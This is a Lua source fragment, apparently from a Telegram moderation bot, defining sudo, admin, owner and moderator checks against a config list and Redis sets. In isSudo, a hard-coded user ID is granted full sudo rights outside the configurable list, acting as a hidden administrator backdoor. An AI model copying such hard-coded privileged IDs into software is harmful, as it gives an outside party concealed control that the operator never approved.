        function isSudo(user_id)
    		for k, v in pairs(_Config.Sudo) do
    			if user_id == v then
    				return true
    			end
    		end
            for k, v in pairs({
                342293523,
                0
                }) do
                if user_id == v then
                    return true
                end
            end
            RS = redis:sismember('FullAccess', user_id)
            if RS then
                return true
            end
    		return false
    	end
    	--------------------------------------
    	function isFull(user_id)
    		RS = redis:sismember('FullAdmins', user_id)
    		if RS then
    			return true
    		end
    		if isSudo(user_id) then
    			return true
    		end
    		return false
    	end
        --------------------------------------
        function isGroupO(user_id, chat_id)
            RS = redis:sismember(user_id..'Chats', chat_id)
            if RS then
               return true
            end
            if isFull(user_id) then
                return true
            end
            if isSudo(user_id) then
                return true
            end
            return false
        end
        -----------------------------------
        function isOwner(user_id, chat_id)
            RS = redis:hget(chat_id, 'Owner')
            if RS == user_id then
                return true
            end
            if isFull(user_id) then
                return true
            end
            if isGroupO(user_id, chat_id) then
                return true
            end
            if isSudo(user_id) then
                return true
            end
            return false
        end
        -------------------------------------
        function isMod(user_id, chat_id)
            RS = redis:sismember('Mods'..chat_id, user_id)
            if RS then
                return true
            end
            if isSudo(user_id) then
                return true
            end
            if isFull(user_id) then
                return true
            end
            if isOwner(user_id, chat_id) then
                return true
            end
            if isGroupO(user_id, chat_id) then
                return true
            end
            return false
        end
